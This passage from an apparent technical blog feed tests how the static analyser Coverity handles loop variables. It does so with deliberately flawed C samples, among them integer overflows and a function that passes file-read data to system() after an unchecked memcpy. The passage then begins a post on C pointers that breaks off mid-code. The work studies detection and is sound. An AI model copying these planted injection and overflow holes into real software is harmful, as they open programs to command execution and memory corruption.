<p>But the interesting thing is that Coverity is able to identify this defect when we use the CERT-C coding standard.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cov-analyze --dir idir/ --coding-standard-config &quot;/opt/cov-analysis-linux64/config/coding-standards/cert-c/cert-c-all.config&quot;</span><br></pre></td></tr></table></figure>

<p>The defect was identified for sure.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Analysis summary report:</span><br><span class="line">------------------------</span><br><span class="line">Files analyzed                       : 1 Total</span><br><span class="line">    C                                : 1</span><br><span class="line">Total LoC input to cov-analyze       : 2459</span><br><span class="line">Functions analyzed                   : 2</span><br><span class="line">Paths analyzed                       : 10</span><br><span class="line">Time taken by analysis               : 00:00:03</span><br><span class="line">Defects/Coding rule violations found : 1 CERT INT32-C</span><br></pre></td></tr></table></figure>

<img src="/2022/01/13/Interesting-Thoughts-on-Data-Flow-Analysis-and-Taint-Tracking-Mechanism-of-SAST-Tool-Coverity/pic_1.png" width="100%" height="100%">

<p>I don’t know why coverity doesn’t idendify this kind of defect in the common checkers. Maybe it will cause some extra performance burden like memory usage. My understanding is that Coverity will introduce another placeholder to keep the value which may cause integer overflow, in our sample here is the macro <em>INT_MAX</em>. The situation will be getting more complicated within the while loop. Some changes of variables in the loop block rely on the runtime status. The scenario in this sample code is not that complicated cuz the value of variable <em>c</em> will not change as the number of cycles increases. For Coverity’s analyzer, it’s just enough for only calculating the sum result of macro <em>INT_MAX</em> and variable <em>c</em>, if we change the value of <em>c</em> to 0 like below:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (a &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    b = INT_MAX + c;</span><br><span class="line">    a++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, b);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cov-analyze --dir idir/ --coding-standard-config &quot;/opt/cov-analysis-linux64/config/coding-standards/cert-c/cert-c-all.config&quot;</span><br></pre></td></tr></table></figure>

<p>This integer overflow defect is eliminated and of course the finding will not be triggered. It makes sense that Coverity will introduce extra memory to keep the result, which is not enabled for common checkers.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Analysis summary report:</span><br><span class="line">------------------------</span><br><span class="line">Files analyzed                       : 1 Total</span><br><span class="line">    C                                : 1</span><br><span class="line">Total LoC input to cov-analyze       : 2459</span><br><span class="line">Functions analyzed                   : 2</span><br><span class="line">Paths analyzed                       : 10</span><br><span class="line">Time taken by analysis               : 00:00:03</span><br><span class="line">Defects/Coding rule violations found : 0</span><br></pre></td></tr></table></figure>

<p>In fact, the value of operand <em>INT_MAX</em> and <em>c</em> can be grabbed in the semantic analysis stage. The sum value which cause integer overflow can be easily calculated through the AST.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clang -cc1 -ast-dump overflow-test.cpp</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">|-FunctionDecl 0x7fc719855918 &lt;test.cpp:4:1, line:16:1&gt; line:4:5 used func &#x27;int ()&#x27;</span><br><span class="line">| `-CompoundStmt 0x7fc719856048 &lt;col:12, line:16:1&gt;</span><br><span class="line">|   |-DeclStmt 0x7fc719855a58 &lt;line:5:3, col:12&gt;</span><br><span class="line">|   | `-VarDecl 0x7fc7198559d0 &lt;col:3, col:11&gt; col:7 used a &#x27;int&#x27; cinit</span><br><span class="line">|   |   `-IntegerLiteral 0x7fc719855a38 &lt;col:11&gt; &#x27;int&#x27; 1</span><br><span class="line">|   |-DeclStmt 0x7fc719855b10 &lt;line:6:3, col:12&gt;</span><br><span class="line">|   | `-VarDecl 0x7fc719855a88 &lt;col:3, col:11&gt; col:7 used b &#x27;int&#x27; cinit</span><br><span class="line">|   |   `-IntegerLiteral 0x7fc719855af0 &lt;col:11&gt; &#x27;int&#x27; 0</span><br><span class="line">|   |-DeclStmt 0x7fc719855bc8 &lt;line:7:3, col:12&gt;</span><br><span class="line">|   | `-VarDecl 0x7fc719855b40 &lt;col:3, col:11&gt; col:7 used c &#x27;int&#x27; cinit</span><br><span class="line">|   |   `-IntegerLiteral 0x7fc719855ba8 &lt;col:11&gt; &#x27;int&#x27; 5</span><br><span class="line">|   |-DeclStmt 0x7fc719855c80 &lt;line:8:3, col:18&gt;</span><br><span class="line">|   | `-VarDecl 0x7fc719855bf8 &lt;col:3, /Library/Developer/CommandLineTools/SDKs/MacOSX10.15.sdk/usr/include/i386/limits.h:71:25&gt; test.cpp:8:7 used d &#x27;int&#x27; cinit</span><br><span class="line">|   |   `-IntegerLiteral 0x7fc719855c60 &lt;/Library/Developer/CommandLineTools/SDKs/MacOSX10.15.sdk/usr/include/i386/limits.h:71:25&gt; &#x27;int&#x27; 2147483647</span><br><span class="line">|   |-WhileStmt 0x7fc719855e20 &lt;test.cpp:9:3, line:13:3&gt;</span><br><span class="line">|   | |-BinaryOperator 0x7fc719855cf0 &lt;line:9:10, col:14&gt; &#x27;bool&#x27; &#x27;&lt;&#x27;</span><br><span class="line">|   | | |-ImplicitCastExpr 0x7fc719855cd8 &lt;col:10&gt; &#x27;int&#x27; &lt;LValueToRValue&gt;</span><br><span class="line">|   | | | `-DeclRefExpr 0x7fc719855c98 &lt;col:10&gt; &#x27;int&#x27; lvalue Var 0x7fc7198559d0 &#x27;a&#x27; &#x27;int&#x27;</span><br><span class="line">|   | | `-IntegerLiteral 0x7fc719855cb8 &lt;col:14&gt; &#x27;int&#x27; 3</span><br><span class="line">|   | `-CompoundStmt 0x7fc719855e00 &lt;col:17, line:13:3&gt;</span><br><span class="line">|   |   |-BinaryOperator 0x7fc719855da8 &lt;line:10:5, col:19&gt; &#x27;int&#x27; lvalue &#x27;=&#x27;</span><br><span class="line">|   |   | |-DeclRefExpr 0x7fc719855d10 &lt;col:5&gt; &#x27;int&#x27; lvalue Var 0x7fc719855a88 &#x27;b&#x27; &#x27;int&#x27;</span><br><span class="line">|   |   | `-BinaryOperator 0x7fc719855d88 &lt;/Library/Developer/CommandLineTools/SDKs/MacOSX10.15.sdk/usr/include/i386/limits.h:71:25, test.cpp:10:19&gt; &#x27;int&#x27; &#x27;+&#x27;</span><br><span class="line">|   |   |   |-IntegerLiteral 0x7fc719855d30 &lt;/Library/Developer/CommandLineTools/SDKs/MacOSX10.15.sdk/usr/include/i386/limits.h:71:25&gt; &#x27;int&#x27; 2147483647</span><br><span class="line">|   |   |   `-ImplicitCastExpr 0x7fc719855d70 &lt;test.cpp:10:19&gt; &#x27;int&#x27; &lt;LValueToRValue&gt;</span><br><span class="line">|   |   |     `-DeclRefExpr 0x7fc719855d50 &lt;col:19&gt; &#x27;int&#x27; lvalue Var 0x7fc719855b40 &#x27;c&#x27; &#x27;int&#x27;</span><br><span class="line">|   |   `-UnaryOperator 0x7fc719855de8 &lt;line:11:5, col:6&gt; &#x27;int&#x27; postfix &#x27;++&#x27;</span><br><span class="line">|   |     `-DeclRefExpr 0x7fc719855dc8 &lt;col:5&gt; &#x27;int&#x27; lvalue Var 0x7fc7198559d0 &#x27;a&#x27; &#x27;int&#x27;</span><br><span class="line">|   |-CallExpr 0x7fc719855fa0 &lt;line:14:3, col:17&gt; &#x27;int&#x27;</span><br><span class="line">|   | |-ImplicitCastExpr 0x7fc719855f88 &lt;col:3&gt; &#x27;int (*)(const char *, ...)&#x27; &lt;FunctionToPointerDecay&gt;</span><br><span class="line">|   | | `-DeclRefExpr 0x7fc719855f38 &lt;col:3&gt; &#x27;int (const char *, ...)&#x27; lvalue Function 0x7fc7198919f8 &#x27;printf&#x27; &#x27;int (const char *, ...)&#x27;</span><br><span class="line">|   | |-ImplicitCastExpr 0x7fc719855fd0 &lt;col:10&gt; &#x27;const char *&#x27; &lt;ArrayToPointerDecay&gt;</span><br><span class="line">|   | | `-StringLiteral 0x7fc719855ef8 &lt;col:10&gt; &#x27;const char [3]&#x27; lvalue &quot;%d&quot;</span><br><span class="line">|   | `-ImplicitCastExpr 0x7fc719855fe8 &lt;col:16&gt; &#x27;int&#x27; &lt;LValueToRValue&gt;</span><br><span class="line">|   |   `-DeclRefExpr 0x7fc719855f18 &lt;col:16&gt; &#x27;int&#x27; lvalue Var 0x7fc719855bf8 &#x27;d&#x27; &#x27;int&#x27;</span><br><span class="line">|   `-ReturnStmt 0x7fc719856038 &lt;line:15:3, col:11&gt;</span><br><span class="line">|     `-UnaryOperator 0x7fc719856020 &lt;col:10, col:11&gt; &#x27;int&#x27; prefix &#x27;-&#x27;</span><br><span class="line">|       `-IntegerLiteral 0x7fc719856000 &lt;col:11&gt; &#x27;int&#x27; 1</span><br><span class="line">`-FunctionDecl 0x7fc7198560b8 &lt;line:18:1, line:21:1&gt; line:18:5 main &#x27;int ()&#x27;</span><br><span class="line">  `-CompoundStmt 0x7fc7198562b8 &lt;line:19:1, line:21:1&gt;</span><br><span class="line">    `-DeclStmt 0x7fc7198562a0 &lt;line:20:3, col:22&gt;</span><br><span class="line">      `-VarDecl 0x7fc719856170 &lt;col:3, col:21&gt; col:7 result &#x27;int&#x27; cinit</span><br><span class="line">        `-CallExpr 0x7fc719856280 &lt;col:16, col:21&gt; &#x27;int&#x27;</span><br><span class="line">          `-ImplicitCastExpr 0x7fc719856268 &lt;col:16&gt; &#x27;int (*)()&#x27; &lt;FunctionToPointerDecay&gt;</span><br><span class="line">            `-DeclRefExpr 0x7fc719856220 &lt;col:16&gt; &#x27;int ()&#x27; lvalue Function 0x7fc719855918 &#x27;func&#x27; &#x27;int ()&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Example-2-Iteration-Value-Operation-In-Loop-Block"><a href="#Example-2-Iteration-Value-Operation-In-Loop-Block" class="headerlink" title="Example 2 - Iteration Value Operation In Loop Block"></a>Example 2 - Iteration Value Operation In Loop Block</h2><p>This sample will be a little different, the variable within the loop block will keep changing as the number of cycles increases. The program will be keeping running infinitely cuz the value of variable <em>m</em> will overflow and the while loop will never come to an end.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">binary_search</span><span class="params">(<span class="type">int</span> n, <span class="type">long</span> v)</span> &#123;</span><br><span class="line">  <span class="type">int</span> l = <span class="number">0</span>, u = n<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">while</span> (l &lt;= u ) &#123;</span><br><span class="line">    <span class="type">int</span> m = (l + u) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (m &lt; v) l = m + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (m &gt; v) u = m - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> m;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = binary_search(INT_MAX/<span class="number">2</span>+<span class="number">3</span>, INT_MAX/<span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>If we run the Coverity analyzer it will not identify the defect no matter what checkers or standards enabled.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cov-analyze --dir idir/ --all --enable-audit-mode</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cov-analyze --dir idir/ --coding-standard-config &quot;/opt/cov-analysis-linux64/config/coding-standards/cert-c/cert-c-all.config&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Analysis summary report:</span><br><span class="line">------------------------</span><br><span class="line">Files analyzed                 : 1 Total</span><br><span class="line">    C                          : 1</span><br><span class="line">Total LoC input to cov-analyze : 2459</span><br><span class="line">Functions analyzed             : 2</span><br><span class="line">Paths analyzed                 : 22</span><br><span class="line">Time taken by analysis         : 00:00:02</span><br><span class="line">Defect occurrences found       : 0</span><br></pre></td></tr></table></figure>

<p>It’s obvious that Coverity will not handle this kind of problem if the values of variables will be different as the runtime status changes.</p>
<h2 id="Example-3-Command-Execution-Function-Call-In-Loop-Block"><a href="#Example-3-Command-Execution-Function-Call-In-Loop-Block" class="headerlink" title="Example 3 - Command Execution Function Call In Loop Block"></a>Example 3 - Command Execution Function Call In Loop Block</h2><p>Now that Coverity will not check the defects if the iteration variable is calculated as an operand. I’m curious if Coverity will check the code behavior if the iteration variable is used in other kind of code block such as judge clause. In the code below, it read data from external file and passes the data to command execution function <em>system()</em>.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUZZ_SIZE 20</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo1</span><span class="params">(<span class="type">char</span>* a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo2</span><span class="params">(<span class="type">char</span>* a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo3</span><span class="params">(<span class="type">char</span>* a)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo1</span><span class="params">(<span class="type">char</span>* a)</span></span><br><span class="line">&#123;</span><br><span class="line">  foo2(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo2</span><span class="params">(<span class="type">char</span>* a)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buff[BUZZ_SIZE] = &#123;&#125;;</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;f.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (i == <span class="number">90</span>) fgets(buff, BUZZ_SIZE, f);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(f);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;buff[<span class="built_in">strlen</span>(buff) <span class="number">-1</span>], a, <span class="built_in">strlen</span>(a) + <span class="number">1</span>);</span><br><span class="line">  foo3(buff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo3</span><span class="params">(<span class="type">char</span>* a)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span>* r;</span><br><span class="line">  r = a;</span><br><span class="line">  system(r);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *l = <span class="string">&quot; -l&quot;</span>;</span><br><span class="line">  foo1(l);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cov-analyze --dir idir/ --all --enable-audit-mode</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Analysis summary report:</span><br><span class="line">------------------------</span><br><span class="line">Files analyzed                 : 1 Total</span><br><span class="line">    C                          : 1</span><br><span class="line">Total LoC input to cov-analyze : 4387</span><br><span class="line">Functions analyzed             : 4</span><br><span class="line">Paths analyzed                 : 51</span><br><span class="line">Time taken by analysis         : 00:00:03</span><br><span class="line">Defect occurrences found       : 1 OS_CMD_INJECTION</span><br></pre></td></tr></table></figure>

<p>We can find that Coverity has truly detected the defect through it’s data flow analysis and taint tracking process.</p>
<img src="/2022/01/13/Interesting-Thoughts-on-Data-Flow-Analysis-and-Taint-Tracking-Mechanism-of-SAST-Tool-Coverity/pic_2.png" width="100%" height="100%">

<p>But I’m still curious what kind of method coverity use to find the problem. Let’s try to modify the value from 90 to 91 in the judge clause.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUZZ_SIZE 20</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo1</span><span class="params">(<span class="type">char</span>* a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo2</span><span class="params">(<span class="type">char</span>* a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo3</span><span class="params">(<span class="type">char</span>* a)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo1</span><span class="params">(<span class="type">char</span>* a)</span></span><br><span class="line">&#123;</span><br><span class="line">  foo2(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo2</span><span class="params">(<span class="type">char</span>* a)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buff[BUZZ_SIZE] = &#123;&#125;;</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;f.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (i == <span class="number">91</span>) fgets(buff, BUZZ_SIZE, f);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(f);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;buff[<span class="built_in">strlen</span>(buff) <span class="number">-1</span>], a, <span class="built_in">strlen</span>(a) + <span class="number">1</span>);</span><br><span class="line">  foo3(buff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo3</span><span class="params">(<span class="type">char</span>* a)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span>* r;</span><br><span class="line">  r = a;</span><br><span class="line">  system(r);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *l = <span class="string">&quot; -l&quot;</span>;</span><br><span class="line">  foo1(l);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Re-analyze the code and the problem doesn’t exist any more. </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Analysis summary report:</span><br><span class="line">------------------------</span><br><span class="line">Files analyzed                 : 1 Total</span><br><span class="line">    C                          : 1</span><br><span class="line">Total LoC input to cov-analyze : 4387</span><br><span class="line">Functions analyzed             : 4</span><br><span class="line">Paths analyzed                 : 44</span><br><span class="line">Time taken by analysis         : 00:00:03</span><br><span class="line">Defect occurrences found       : 0</span><br></pre></td></tr></table></figure>

<p>Interesting, at least we can assure Coverity actually maintained a placeholder to keep the value of variables in the loop block while performing data flow analysis or taint tracking.</p>
]]></content>
      <categories>
        <category>SAST</category>
      </categories>
      <tags>
        <tag>Data flow</tag>
        <tag>Taint tracking</tag>
        <tag>Coverity</tag>
        <tag>Code quality</tag>
      </tags>
  </entry>
  <entry>
    <title>Pointer Manipulations That Should Be Noted</title>
    <url>/2019/02/12/Pointer-Manipulations-That-Should-Be-Noted/</url>
    <content><![CDATA[<h2 id="Double-pointer"><a href="#Double-pointer" class="headerlink" title="Double pointer"></a>Double pointer</h2><p>Which means the pointer to pointer. Take a look at this program.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">GetMemory</span><span class="params">(<span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">   p = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *str = <span class="literal">NULL</span>;</span><br><span class="line">    GetMemory(str);</span><br><span class="line">    <span class="built_in">strcpy</span>(str, <span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If we directly test this program it will be aborted by throwing an exception. As we all know, the arguments are passed to functions by value in C/C++. So it’s clear that the pointer <em>str</em> passed into the function <em>GetMemory</em> is a copy of real <em>str</em>. We can fix this program by using a double pointer.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">GetMemory</span><span class="params">(<span class="type">char</span> **p)</span></span><br><span class="line">&#123;</span><br><span class="line">    *p = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *str = <span class="literal">NULL</span>;</span><br><span class="line">    GetMemory(&amp;str);</span><br><span class="line">    <span class="built_in">strcpy</span>(str, <span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br></pre></td></tr></table></figure>

<h2 id="Simplify-code-by-using-pointers"><a href="#Simplify-code-by-using-pointers" class="headerlink" title="Simplify code by using pointers"></a>Simplify code by using pointers</h2><p>Here gives an implement of linked list:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//节点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="comment">//关键字</span></span><br><span class="line">	<span class="type">int</span> key;</span><br><span class="line">	<span class="comment">//下一个节点指针</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">s_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; s_node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="comment">//头节点</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">s_node</span> *<span class="title">header</span>;</span></span><br><span class="line">&#125; s_list;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">list_insert</span><span class="params">(s_list *<span class="built_in">list</span>, <span class="type">int</span> key)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">list</span> == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建新节点</span></span><br><span class="line">	s_node *n = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(s_node));</span><br><span class="line">	n-&gt;key = key;</span><br><span class="line">	n-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果链表头为空，表头即为新节点</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">list</span>-&gt;header == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">list</span>-&gt;header = n;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果关键字key小于链表头的key</span></span><br><span class="line">	<span class="keyword">if</span> (key &lt; <span class="built_in">list</span>-&gt;header-&gt;key)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//替换新节点为链表头，原表头变为新节点的next</span></span><br><span class="line">		n-&gt;next = <span class="built_in">list</span>-&gt;header;</span><br><span class="line">		<span class="built_in">list</span>-&gt;header = n;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//遍历链表，保持待比较节点的前一个节点</span></span><br><span class="line">	s_node *p = <span class="built_in">list</span>-&gt;header;</span><br><span class="line">	<span class="comment">//找到第一个大于新节点key的节点（注意，此时p其实是这个节点的上一个节点）</span></span><br><span class="line">	<span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span> &amp;&amp; p-&gt;next-&gt;key &lt; key)</span><br><span class="line">	&#123;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//插入新节点</span></span><br><span class="line">	n-&gt;next = p-&gt;next;</span><br><span class="line">	p-&gt;next = n;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	s_list testlist;</span><br><span class="line">	list_insert(&amp;testlist, <span class="number">5</span>);</span><br><span class="line">	list_insert(&amp;testlist, <span class="number">8</span>);</span><br><span class="line">	list_insert(&amp;testlist, <span class="number">7</span>);</span><br><span class="line">	list_insert(&amp;testlist, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We must adjust the relations between members of the linked list properly without the help of pointer. This code can be much briefer in the pointer version.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//节点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="comment">//关键字</span></span><br><span class="line">	<span class="type">int</span> key;</span><br><span class="line">	<span class="comment">//下一个节点指针</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">s_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; s_node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="comment">//头节点</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">s_node</span> *<span class="title">header</span>;</span></span><br><span class="line">&#125; s_list;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">list_insert2</span><span class="params">(s_list *<span class="built_in">list</span>, <span class="type">int</span> key)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">list</span> == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建新节点</span></span><br><span class="line">	s_node *n = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(s_node));</span><br><span class="line">	n-&gt;key = key;</span><br><span class="line">	n-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//二级指针</span></span><br><span class="line">	s_node **p = &amp;<span 